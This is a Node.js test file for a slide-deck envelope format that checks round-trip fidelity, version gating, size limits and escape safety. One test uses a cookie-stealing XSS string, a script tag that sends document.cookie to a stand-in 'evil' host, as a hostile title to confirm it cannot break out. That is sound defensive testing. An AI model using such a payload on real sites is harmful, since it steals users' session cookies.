const test = require('node:test');
const assert = require('node:assert/strict');
const {
	LATTICE_DOC_VERSION,
	ENVELOPE_ID,
	buildManifest,
	serializeEnvelope,
	buildEnvelope,
	parseEnvelope,
	readEnvelopePayload,
} = require('../../../lib/core/lattice-doc.js');

// The Lattice document envelope (lib/core/lattice-doc.js) — the P2 kernel from
// 2026-07-07-html-lattice-player.md. Two contracts under test: lossless round-trip
// (parent §3a — carry the source, never scrape) and escape-safety (§Security 2 —
// base64 the WHOLE envelope so no deck field can break out of the <script>).

const sampleDeck = {
	source: '---\ntheme: indaco\n---\n\n# Hello\n\nA line with `code` and a <!-- note -->.\n',
	title: 'Q3 board review',
	theme: { name: 'indaco', palette: 'indaco', mode: 'dark', css: null },
	config: { paginate: true },
	notes: true,
};

test('round-trip: parseEnvelope(serializeEnvelope(buildManifest(deck))) recovers the source byte-for-byte', () => {
	const env = buildEnvelope(sampleDeck, { now: 1720000000000, build: 'test', playerVersion: '1' });
	const m = parseEnvelope(env);
	assert.equal(m.source, sampleDeck.source, 'source must be byte-identical');
	assert.equal(m.title, sampleDeck.title);
	assert.deepEqual(m.theme, sampleDeck.theme);
	assert.deepEqual(m.config, sampleDeck.config);
	assert.equal(m.notes, true);
	assert.equal(m.format, 'lattice');
	assert.equal(m.version, LATTICE_DOC_VERSION);
});

test('round-trip: the readAlong section survives byte-exact (2026-07-08 export manifest)', () => {
	// A regenerate-mode read-along: voice config + one narrated slide's MEASURED track,
	// no embedded audio. The kernel carries it verbatim (the caller, which has Cadenza,
	// builds it). See engineering/decisions/2026-07-08-read-along-export-manifest.md.
	const readAlong = {
		version: '1.0',
		audioMode: 'regenerate',
		voice: { model: 'hexgrad/kokoro-82m', voice: 'af_heart', speed: 1 },
		pace: 'moderate',
		slides: [
			{
				index: 0,
				track: {
					durationMs: 1800,
					cues: [
						{
							display: 'Revenue grew.',
							startMs: 0,
							endMs: 1800,
							words: [
								{ display: 'Revenue', spoken: 'Revenue', startMs: 0, endMs: 900, charOffset: 0 },
								{ display: 'grew.', spoken: 'grew.', startMs: 900, endMs: 1800, charOffset: 8 },
							],
						},
					],
				},
				audio: null,
			},
		],
	};
	const deck = { source: '# Deck\n\n<!-- Revenue grew. -->\n', title: 'RA', readAlong };
	const m = parseEnvelope(buildEnvelope(deck, { now: 1720000000000, build: 'test' }));
	assert.equal(m.source, deck.source, 'source stays byte-exact');
	assert.deepEqual(m.readAlong, readAlong, 'readAlong round-trips structurally');
});

test('a deck without a read-along carries no readAlong key (lean envelope, additive)', () => {
	const m = parseEnvelope(buildEnvelope(sampleDeck));
	assert.ok(!('readAlong' in m), 'absent when the deck has no read-along');
});

test('the auto-glossary term→definition projection round-trips when present (#920)', () => {
	const glossary = [
		{ term: 'ARR', definition: 'Revenue that recurs yearly.' },
		{ term: 'CAC', definition: 'Cost to win one customer.' },
	];
	const m = parseEnvelope(buildEnvelope({ ...sampleDeck, glossary }));
	assert.deepEqual(m.glossary, glossary);
});

test('a deck with no glossary (or an empty one) carries no glossary key (lean envelope, additive)', () => {
	assert.ok(!('glossary' in parseEnvelope(buildEnvelope(sampleDeck))), 'absent when unset');
	assert.ok(!('glossary' in buildManifest({ ...sampleDeck, glossary: [] })), 'empty array omitted');
});

test('escape-safety: a hostile </script> title cannot break out of the envelope', () => {
	const hostile = {
		source: '# ok\n\n```\n</script><script>alert(1)</script>\n```\n',
		title: '</script><script>fetch("//evil?c="+document.cookie)</script>',
		config: { footer: 'x --> <!-- y', evil: '</SCRIPT >' },
	};
	const env = buildEnvelope(hostile);
	// The serialized envelope has exactly ONE opening <script (the wrapper) and one
	// closing </script (the wrapper's) — nothing from deck content leaks a tag.
	assert.equal((env.match(/<script/gi) || []).length, 1, 'only the wrapper opens a script');
	assert.equal((env.match(/<\/script/gi) || []).length, 1, 'only the wrapper closes a script');
	// The payload between the tags is pure base64 — no angle brackets at all.
	const payload = readEnvelopePayload(env);
	assert.match(payload, /^[A-Za-z0-9+/=]+$/, 'payload is pure base64');
	// And it still round-trips the hostile content losslessly.
	const m = parseEnvelope(env);
	assert.equal(m.source, hostile.source);
	assert.equal(m.title, hostile.title);
	assert.deepEqual(m.config, hostile.config);
});

test('escape-safety: U+2028/U+2029 and lone surrogates survive the round-trip', () => {
	const tricky = { source: 'line1 line2 line3 \u{1F600} end\n', title: 'ok' };
	const m = parseEnvelope(buildEnvelope(tricky));
	assert.equal(m.source, tricky.source);
});

test('version gate: a newer-than-known format version is refused with a clear message', () => {
	// Hand-forge an envelope one major ahead.
	const future = buildManifest({ source: '# x\n' });
	future.version = LATTICE_DOC_VERSION + 1;
	const env = serializeEnvelope(future);
	assert.throws(() => parseEnvelope(env), /needs a newer Lattice/);
});

test('validation: a non-Lattice / malformed envelope throws, does not silently pass', () => {
	assert.throws(() => parseEnvelope('not base64 and not html'), /no lattice-doc node|unreadable/i);
	const notOurs = serializeEnvelope({ format: 'other', version: 1, source: 'x' });
	assert.throws(() => parseEnvelope(notOurs), /missing the Lattice manifest/);
	// Valid manifest shape but missing source is rejected (can't re-import).
	const noSource = Buffer.from(JSON.stringify({ format: 'lattice', version: 1 }), 'utf8').toString('base64');
	assert.throws(() => parseEnvelope(`<script id="${ENVELOPE_ID}">${noSource}</script>`), /source is missing/);
});

test('size guard: an oversized payload is rejected before it can OOM the importer', () => {
	// A base64 string longer than the encoded ceiling (~4/3 of 64 MB) must throw
	// without allocating the decoded string.
	const overCeiling = 'A'.repeat(Math.ceil((64 * 1024 * 1024) * 4 / 3) + 8);
	assert.throws(() => parseEnvelope(overCeiling), /exceeds the size limit/);
});

test('buildManifest requires a verbatim source string', () => {
	assert.throws(() => buildManifest({ title: 'no source' }), /source .* is required/);
});

test('envelope embeds cleanly in an HTML document and is found by id', () => {
	const env = buildEnvelope(sampleDeck);
	const html = `<!DOCTYPE html><html><head><title>t</title></head><body>\n<section>slide</section>\n${env}\n</body></html>`;
	const m = parseEnvelope(html);
	assert.equal(m.source, sampleDeck.source);
});

test('untrusted title is clamped on import (length + whitespace), mirroring .lattice', () => {
	const big = buildManifest({ source: '# x\n' });
	big.title = `${'A'.repeat(5000)}\n\nlots\tof   whitespace`;
	const m = parseEnvelope(serializeEnvelope(big));
	assert.ok(m.title.length <= 120, 'title capped to MAX_TITLE_LEN');
	assert.doesNotMatch(m.title, /\s{2,}|\n|\t/, 'whitespace collapsed');
	// An empty/whitespace-only title falls back, never blank.
	const blank = buildManifest({ source: '# x\n' });
	blank.title = '   \n  ';
	assert.equal(parseEnvelope(serializeEnvelope(blank)).title, 'Untitled deck');
});

test('source round-trips a lone surrogate byte-for-byte (better than the zip path)', () => {
	const lone = { source: 'before \ud800 after\n', title: 'ok' };
	assert.equal(parseEnvelope(buildEnvelope(lone)).source, lone.source);
});

test('config/theme are JSON-projected (documented lossy) — source stays exact', () => {
	const d = { source: '# real\n', title: 'ok', config: { keep: 1, gone: undefined, notNum: NaN } };
	const m = parseEnvelope(buildEnvelope(d));
	assert.equal(m.source, d.source, 'source is always exact');
	assert.equal(m.config.keep, 1);
	assert.ok(!('gone' in m.config), 'undefined key dropped by JSON (documented)');
	assert.equal(m.config.notNum, null, 'NaN → null by JSON (documented)');
});

test('a non-JSON-safe config (BigInt) fails serialization with a clear message, not an opaque crash', () => {
	assert.throws(() => buildEnvelope({ source: '# x\n', config: { n: 10n } }), /not JSON-safe/);
});

test('first envelope node wins when a decoy id="lattice-doc" precedes the real one', () => {
	const real = buildEnvelope({ source: '# REAL\n', title: 'real' });
	const decoy = buildEnvelope({ source: '# DECOY\n', title: 'decoy' });
	// Decoy first in document order → decoded (documented first-match behavior).
	assert.equal(parseEnvelope(`<body>${decoy}\n${real}</body>`).source, '# DECOY\n');
});
